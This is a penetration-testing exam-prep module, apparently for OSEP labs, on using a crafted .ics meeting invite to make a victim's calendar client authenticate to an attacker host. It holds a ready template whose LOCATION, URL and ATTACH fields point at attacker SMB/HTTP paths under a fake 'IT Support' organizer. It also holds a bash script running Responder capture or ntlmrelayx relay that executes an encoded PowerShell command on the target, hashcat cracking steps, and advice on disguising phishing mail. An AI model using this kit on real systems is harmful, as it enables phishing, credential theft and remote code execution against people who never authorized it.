::: warning Authorized use only
For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
:::

# 16 · ICS calendar invite triggers authentication (scenario 13)

> One-liner: you know the recipient address, the target will process meeting invites, but there is no macro execution path → send an `.ics` invite that **references external resources**, so the calendar client fetches them on parse/render/reminder and authenticates; capture hashes with Responder on the attacker box, or relay with ntlmrelayx to another SMB target.
> Course chapter 5 (Initial Access / client-side); cheat-sheet keywords: `Relay Attacks`, `Capture Hashes`.
> **Core idea: whether auth fires depends on the calendar client version and config — “invite received / accepted” ≠ “auth will fire”. Require protocol-log evidence before moving on.**

---

## Scenario 13: ICS calendar invite triggers authentication

## 1. Situation

> From `scenarios.md` (scenario 13): the target accepts calendar invites, but there is no macro execution opportunity. You know the recipient address; the target will process meeting invites. In the lab, the calendar client **may** fetch external resources referenced by the invite and authenticate.
> Prepare ahead: the course ICS invite file, plus notes for auth capture and follow-on handling.

One-liner exam point: an `.ics` invite is a carrier that makes the client **call back** to you; put a UNC path or URL in `LOCATION` / `DESCRIPTION` / `URL` / `ATTACH`. When the client handles the invite it may open SMB (`\\LHOST\...`) or HTTP(S). Whether auth succeeds and which protocol is used is entirely client behavior — **do not assume**.

---

## 2. Assumptions

| Assumption | Notes | If false |
|---|---|---|
| Known target mailbox | Scenario gives `USER@DOMAIN` | Cannot deliver; change entry |
| Target opens/accepts calendar invites | Client at least parses invite content | See failure branch 1 |
| Client resolves external refs | Outlook / OWA / Thunderbird / Apple Calendar differ on LOCATION/URL/attachments | See failure branches 2, 3 |
| Target can reach attacker | Auth = target initiates to `LHOST`; egress must be open | Find a reachable callback path first |
| Target identity has lateral value | Domain user; hash crackable/relayable | Crack-only value is limited; see §8 |
| Client runs on Windows | SMB refs can trigger NTLM (NTLMv2) auth | Non-Windows clients usually only hit HTTP — no auth hash |

Lab defaults: attacker = Kali; target = Windows + AD (domain user); Outlook/OWA-class client handles the invite.

---

## 3. Why the client fetches external resources

An `.ics` (iCalendar, RFC 5545) `VEVENT` can include fields the client may actively fetch:

- `LOCATION`: UNC `\\LHOST\share\...`. Some clients resolve network locations when rendering invites/reminders; if the user opens “Location”, Explorer walks SMB → auth.
- `DESCRIPTION`: `https://URL/...` or UNC; HTML-capable clients that auto-load external content issue HTTP.
- `URL`: invite’s own link; click or reading-pane preview may fetch it.
- `ATTACH;FMTTYPE=...`: external attachment; “download attachment preview” fetches it.

**Real trigger behavior is highly variable**: Outlook defaults to blocking automatic download of images/external content; versions differ on whether UNC in LOCATION is resolved or probed over SMB. Do not bet on one field — put **multiple refs in the same invite** (SMB + HTTPS token) and let logs show which one the client touched.

> Design rule: SMB refs are the primary path to auth hashes; HTTP(S) refs only **prove** the client fetches external content (validate the trigger chain). Use both as probes.

---

## 4. Prepare (attacker)

Infra (dirs, port conventions) is in [00-environment-and-infra](/modules/00-environment-and-infra); here only scenario-13 specifics.

```bash
mkdir -p ~/osep/{logs,payloads/infra,loot}

# Tool presence check
which responder impacket-ntlmrelayx hashcat

# Unique token: distinguish which victim / which delivery
TOKEN="m16-$(date +%s | tail -c 6)"      # e.g. m16-3f2a91
echo "$TOKEN"                            # note it; later filter logs and embed in ICS
```

### 4.1 Generate the invite (replace placeholders)

Template `m16-ics-invite.ics` uses placeholders `LHOST` `URL` `USER` `DOMAIN`. Before sending, sed-replace once and generate a **per-delivery unique token path**:

```bash
cd ~/osep/payloads/infra
sed -e "s/LHOST/192.168.45.10/g" \
    -e "s|URL|http://192.168.45.10|g" \
    -e "s/USER/victim/g" -e "s/DOMAIN/corp.local/g" \
    -e "s/TOKEN/${TOKEN}/g" \
    m16-ics-invite.ics \
    > invite-${TOKEN}.ics
head -20 invite-${TOKEN}.ics      # confirm replacements before send
```

> Spec-wise `.ics` wants CRLF and long-line folding; most clients (including Outlook) tolerate LF. If the target client fails to parse, convert line endings then resend: `sed -i 's/$/\r/' invite-${TOKEN}.ics`.

### 4.2 Prepare capture (pick one mode, or sequence them)

Capture (hashes) and relay (hit another host) **cannot run together** — ntlmrelayx and Responder both bind 445 (and related ports). Suggested flow: capture first to confirm trigger; after confirming SMB signing is off, switch to relay. One-shot script: `m16-auth-capture.sh`. Manual equivalents:

```bash
# Mode A: Responder capture (default on a chosen iface; WPAD optional to reduce noise)
sudo responder -I eth0 -wv 2>&1 | tee -a ~/osep/logs/responder.log
#   -I iface; -w start WPAD proxy (optional in exam); -v verbose

# Mode B: ntlmrelayx to a chosen SMB target (confirm SMB signing not required)
sudo impacket-ntlmrelayx --no-http-server -smb2support \
  -t smb://TARGET \
  -c "powershell -enc BASE64PAYLOAD" -of ~/osep/loot/relay-hashes.txt
```

SMB signing check (required before relay):

```bash
nmap -p 445 --script smb2-security-mode TARGET
# relay only when smb2-security-mode reports "Message signing enabled but not required"
```

---

#### `m16-ics-invite.ics` {#m16-ics-invite-ics}

````text
# ---- header (NOT part of the iCalendar spec) --------------------------------
# Purpose: calendar invite template — LOCATION/DESCRIPTION/URL/ATTACH reference
#          attacker resources so the calendar client fetches SMB/HTTP and auths
# Scenario: 13 (target accepts calendar invites; no macro path)
# Depends: Responder (SMB auth) or ntlmrelayx (relay) already running;
#          optional HTTP token probe (python3 -m http.server 80)
# Usage: sed-replace placeholders, then deliver, e.g.:
#   sed -e "s/LHOST/192.168.45.10/g" -e "s|URL|http://192.168.45.10|g" \
#       -e "s/USER/victim/g" -e "s/DOMAIN/corp.local/g" \
#       -e "s/TOKEN/m16-3f2a91/g" m16-ics-invite.ics > invite.ics
#       Delivery: mail attachment .ics or inline text/calendar; METHOD=REQUEST
# Placeholders: LHOST=attacker IP  URL=HTTP base (no trailing /)  USER=target account
#               DOMAIN=mail domain  TOKEN=unique delivery id (victim + fetch proof)
# Test status: RFC 5545 field structure checked; not live-tested against real clients
#              If client rejects parse, strip these # comment lines and convert to CRLF
# -----------------------------------------------------------------------------
BEGIN:VCALENDAR
VERSION:2.0
PRODID:-//M16-OSEP//ICS-INVITE//EN
METHOD:REQUEST
CALSCALE:GREGORIAN
BEGIN:VEVENT
UID:m16-TOKEN@LHOST
DTSTAMP:20250101T000000Z
DTSTART:20250101T130000Z
DTEND:20250101T140000Z
SUMMARY:Review and confirm shared document
LOCATION:\\\\LHOST\\share\\TOKEN
DESCRIPTION:Materials for review are ready.\nAccess them at https://URL/TOKEN or from the shared folder \\\\LHOST\\share\\TOKEN.
URL:https://URL/TOKEN/invite.html
ATTACH;FMTTYPE=text/html:https://URL/TOKEN/preview.html
ORGANIZER;CN=IT Support:mailto:it-support@DOMAIN
ATTENDEE;ROLE=REQ-PARTICIPANT;RSVP=TRUE;CN=USER:mailto:USER@DOMAIN
END:VEVENT
END:VCALENDAR
````

#### `m16-auth-capture.sh` {#m16-auth-capture-sh}

````bash
#!/usr/bin/env bash
# Purpose: scenario-13 auth receiver one-shot — Responder Net-NTLMv2 capture /
#          ntlmrelayx relay / HTTP token probe; unified logs + port-busy checks;
#          after hash capture, print follow-on hints
# Scenario: ICS calendar invite triggers outbound auth from the target
# Depends: responder (or impacket-ntlmrelayx), python3, lsof; root for 445/80
# Usage:
#   bash m16-auth-capture.sh capture IFACE [LOGDIR]      # Responder hashes
#   bash m16-auth-capture.sh relay TARGET CMD [LOGDIR]   # relay to SMB target, run CMD
#   bash m16-auth-capture.sh probe [DIR]                 # HTTP token probe (:80)
#   e.g.: bash m16-auth-capture.sh capture eth0
#         bash m16-auth-capture.sh relay 10.10.10.5 \
#             "powershell -enc SQBFAFgAIAAoAC4ALgApAA=="
# Placeholders: IFACE=listen iface  TARGET=SMB relay IP  CMD=command on target
#               LOGDIR=log dir (default ~/osep/logs)  LHOST see module 00
# Test status: bash -n OK; not live-tested (needs Kali + root + responder)
set -euo pipefail

MODE="${1:-}"
LOGDIR="${3:-$HOME/osep/logs}"
mkdir -p "$LOGDIR"

port_busy() { # $1=port ; returns 0 if busy
  command -v lsof >/dev/null 2>&1 && lsof -nP -iTCP:"$1" -sTCP:LISTEN >/dev/null 2>&1
}

case "$MODE" in
  capture)
    IFACE="${2:-}"
    [[ -z "$IFACE" ]] && { echo "Usage: $0 capture IFACE [LOGDIR]" >&2; exit 1; }
    command -v responder >/dev/null 2>&1 || { echo "[!] responder not installed" >&2; exit 1; }
    port_busy 445 && { echo "[!] 445 busy; free the port or stop ntlmrelayx/smb first" >&2; exit 1; }
    TS="$(date +%Y%m%d-%H%M%S)"
    LOG="$LOGDIR/responder-$TS.log"
    echo "[*] Starting Responder @ $IFACE, log: $LOG"
    echo "[*] After delivering ICS, treat THIS line as proof of auth:"
    echo "    [SMB] NTLMv2-SSP Username : DOMAIN\\\\user   (+ Hash line)"
    # -w WPAD, -v verbose; drop -w if noise is high
    sudo responder -I "$IFACE" -wv 2>&1 | tee -a "$LOG"
    echo "[*] After hash: hashcat -m 5600 <hash> /usr/share/wordlists/rockyou.txt"
    echo "[*] Hash lines live in $LOG ([SMB] ... Hash); extract by hand into a single-hash file"
    ;;
  relay)
    TARGET="${2:-}"
    CMD="${3:-}"
    [[ -z "$TARGET" || -z "$CMD" ]] && {
      echo "Usage: $0 relay TARGET \"CMD\" [LOGDIR]" >&2
      echo "  First confirm SMB signing not required: nmap -p445 --script smb2-security-mode TARGET" >&2
      exit 1
    }
    command -v impacket-ntlmrelayx >/dev/null 2>&1 || { echo "[!] impacket-ntlmrelayx not installed" >&2; exit 1; }
    port_busy 445 && { echo "[!] 445 busy; stop Responder before switching to relay" >&2; exit 1; }
    TS="$(date +%Y%m%d-%H%M%S)"
    LOG="$LOGDIR/ntlmrelayx-$TS.log"
    echo "[*] Relaying to smb://$TARGET, log: $LOG"
    # --no-http-server: leave :80 for token probe; -of saves captured hashes
    sudo impacket-ntlmrelayx --no-http-server -smb2support \
      -t "smb://$TARGET" -c "$CMD" -of "$LOG.hashes" 2>&1 | tee -a "$LOG"
    echo "[*] Relay success marker: Authenticating against smb://$TARGET ... SUCCEED"
    ;;
  probe)
    DIR="${2:-$HOME/osep/payloads}"
    port_busy 80 && { echo "[!] 80 busy" >&2; exit 1; }
    [[ -d "$DIR" ]] || { echo "[!] directory missing: $DIR" >&2; exit 1; }
    TS="$(date +%Y%m%d-%H%M%S)"
    LOG="$LOGDIR/http-token-$TS.log"
    echo "[*] HTTP token probe @ :80, dir: $DIR, log: $LOG"
    echo "[*] A request to the unique token path = client fetches external content (≠ auth; see §7)"
    (cd "$DIR" && python3 -m http.server 80 2>&1 | tee -a "$LOG")
    ;;
  *)
    echo "Usage: $0 {capture|relay|probe} ..." >&2
    echo "  capture IFACE     Responder capture (root, binds 445)" >&2
    echo "  relay TARGET CMD  ntlmrelayx relay (stop capture first; binds 445)" >&2
    echo "  probe [DIR]       HTTP token probe (binds 80)" >&2
    exit 1
    ;;
esac
````

## 5. Procedure

1. **Start the receiver**: `bash m16-auth-capture.sh` (or §4.2 manual commands). Confirm listen ports and log paths.
2. **Start HTTP token probe** (optional but recommended): `python3 -m http.server 80 --directory ~/osep/payloads` and watch the log — only a request to the token path proves the client fetches external content.
3. **Generate invite**: §4.1 replace placeholders → `invite-${TOKEN}.ics`.
4. **Deliver** (try both; attachment first, then inline):
   - Attachment: mail with `invite-${TOKEN}.ics`, short body: “Please open and accept the meeting invite in the attachment.”
   - Inline: HTML mail with a `Content-Type: text/calendar; method=REQUEST` calendar block (some clients only handle inline invites, not attachments).
5. **Observe** (critical — do not rush tool switches): Responder / ntlmrelayx log for `[SMB] NTLMv2-SSP` from the target IP; HTTP log for the token path. Note time and source IP.
6. **Handle hashes**: auth appeared → stop sending, go to §8; HTTP fetch only → client fetches content but not SMB; tune via failure branches 2/3.
7. **Cleanup**: stop Responder/relay; archive logs under `~/osep/logs/`; store hashes under `~/osep/loot/`.

---

## 6. Scripts used

| File | Role | When |
|---|---|---|
| `m16-ics-invite.ics` | Invite template (LOCATION=UNC, URL/ATTACH=https token, DESCRIPTION dual refs) | After placeholder replace, as mail attachment/inline |
| `m16-auth-capture.sh` | Responder capture / ntlmrelayx relay one-shot (port checks, logs, hashcat hints) | Start on attacker before each delivery |

Related: cheat sheet `Relay Attacks`, `Capture Hashes`; hash follow-on in [07-credentials-lsass](/modules/07-credentials-lsass) and [12-ad-attacks](/modules/12-ad-attacks).

---

## 7. Validation (invite received ≠ auth)

**The only trustworthy “authenticated” evidence is auth-protocol logs** — not “delivery succeeded” or “they fetched HTTP content”.

| Observation | Conclusion |
|---|---|
| Responder shows `[SMB] NTLMv2-SSP Username : DOMAIN\user` + `Hash`, source = target IP | ✅ Auth confirmed → §8 |
| ntlmrelayx shows `Authenticating against smb://TARGET ... SUCCEED` + `Executed specified command` | ✅ Relay confirmed (session on TARGET) |
| HTTP log shows token-path request | ⚠️ Client fetches external content — **not** auth; keep watching / swap SMB refs |
| Only SMTP delivery receipt, no callback | ❌ Not triggered → failure branches |
| Auth from unrelated account/source | ⚠️ Filter or redeliver; see failure branch 4 |

Observation cadence: leave a **generous watch window** after delivery (open/reminder timing is unpredictable); prepare other entries in parallel — do not idle-wait.

---

## 8. What to do with captured hashes (decision tree)

```
Got auth
├─ Protocol SMB and Hash line is NTLMv2-SSP → Net-NTLMv2
│   ├─ Crack: hashcat -m 5600 hash.txt rockyou.txt
│   │    success → plaintext PASS → normal lateral / WinRM / domain use
│   │    fail → cannot PTH (Net-NTLMv2 is challenge-response, not NTLM hash)
│   └─ Relay: switch ntlmrelayx to an SMB-signing-off target (§4.2 mode B)
├─ Got NTLM (local SAM-style cases) → PTH directly
└─ Only HTTP fetch (no auth) → no hash from this scenario; change entry/client behavior
```

Key points:
- Net-NTLMv2 (hashcat `-m 5600`) is crack or relay only; **do not attempt PTH**.
- Relay target: same domain, SMB signing not required; `crackmapexec smb <range> --gen-relay-list` can batch-find candidates.
- Wordlists/rules and PTH usage: [07-credentials-lsass](/modules/07-credentials-lsass).

---

## 9. Failure branches and alternatives

1. **Client ignores attachment `.ics`** (treats as unknown file): switch to inline `text/calendar`; or send both (attachment + inline). Still no → client may not process calendar invites; change delivery channel (web calendar link, embedded invite) or abandon this entry.
2. **Client treats LOCATION as plain text** (renders but does not resolve UNC): put `https://URL/...` in `URL` and watch for preview fetch; or put a clickable link in `DESCRIPTION` with a short prompt — user click on URL/UNC still triggers SMB/HTTP auth (source is still the target user).
3. **HTTP fetch but no SMB auth**: auto-download of external content disabled, or client prefers HTTP. Keep SMB + HTTPS refs together (template already does); confirm SMB ref was not stripped as plain text; else accept “reachability only” and try ATTACH external-file preview.
4. **Unrelated hashes** (wrong source IP/username): filter `responder.log` for the target IP; put the token only in the invite sent to the target; ignore other requests.
5. **Relay fails** (signing required / port conflict / target unreachable): fall back to capture + crack; or change relay target; `no more targets` from ntlmrelayx is usually signing/permissions — recheck §4.2.
6. **Long silence, no callback**: confirm receiver is up (`ss -ltnp | grep -E '445|80'`), `LHOST` is **reachable from the target** (not a NAT-internal IP), and the invite was actually sent. All green → this client config does not fetch external content (expected); change entry and record per §10.

---

## 10. Exam / OPSEC notes

- **Responder is a poisoner**: by default it answers LLMNR/NBT-NS/WPAD. In the exam, start it only when you need auth, only on the target’s iface, note why it is running, and stop immediately after use.
- **Sending mail leaves artifacts**: deliver only to the intended account; use plausible business wording; do not put attack intent in the body.
- **Log discipline**: Responder/relay/HTTP logs all go under `~/osep/logs/`, hashes under `~/osep/loot/` — the report must reconstruct time / request / result.
- **Time budget**: trigger is uncertain — a low-odds entry. **Prepare/finish other stable scoring paths in parallel**; cap this scenario at ~20–30 minutes of observation, then move on.
- **Do not assume success**: keep “invite received ≠ auth” in your notes; describe the validation process honestly in the report.

---

## 11. Related docs

| Doc | Link |
|---|---|
| [00-environment-and-infra](/modules/00-environment-and-infra) | Delivery/listen infra, log dir conventions |
| [07-credentials-lsass](/modules/07-credentials-lsass) | Crack / PTH after you have a hash |
| [12-ad-attacks](/modules/12-ad-attacks) | Lateral use of hashes/tickets; relay target selection |
| [01-word-vba-office](/modules/01-word-vba-office) | Same mail/client entry family (macro path — excluded here) |
